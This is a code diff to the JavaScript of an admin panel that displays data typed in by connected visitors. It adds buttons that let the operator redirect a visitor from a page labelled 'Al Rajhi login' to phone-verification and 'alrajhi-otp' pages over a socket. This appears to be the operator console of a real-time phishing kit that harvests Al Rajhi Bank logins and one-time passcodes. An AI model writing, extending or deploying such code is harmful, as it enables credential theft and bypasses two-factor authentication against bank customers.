@@ -1273,7 +1273,17 @@
             Object.entries(dataEntry.content).forEach(([key, value]) => {
               html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
             });
-            html += '</div></div>';
+            html += '</div>';
+            
+            // إضافة أزرار للراجحي تسجيل الدخول
+            if (dataEntry.page === 'تسجيل الدخول الراجحى') {
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button onclick="navigateVisitorToPage(\'' + visitor.socketId + '\', \'phone-verification\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توثيق الجوال</button>';
+              html += '<button onclick="navigateVisitorToPage(\'' + visitor.socketId + '\', \'alrajhi-otp\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>راجحي OTP</button>';
+              html += '</div>';
+            }
+            
+            html += '</div>';
           }
         });
         html += '</div>';
@@ -1421,6 +1431,11 @@
       if (page) {
         socket.emit('admin:navigate', { visitorSocketId: socketId, page });
       }
+    }
+
+    // دالة تحويل الزائر لصفحة محددة مباشرة
+    function navigateVisitorToPage(socketId, page) {
+      socket.emit('admin:navigate', { visitorSocketId: socketId, page });
     }
 
     // Card action functions
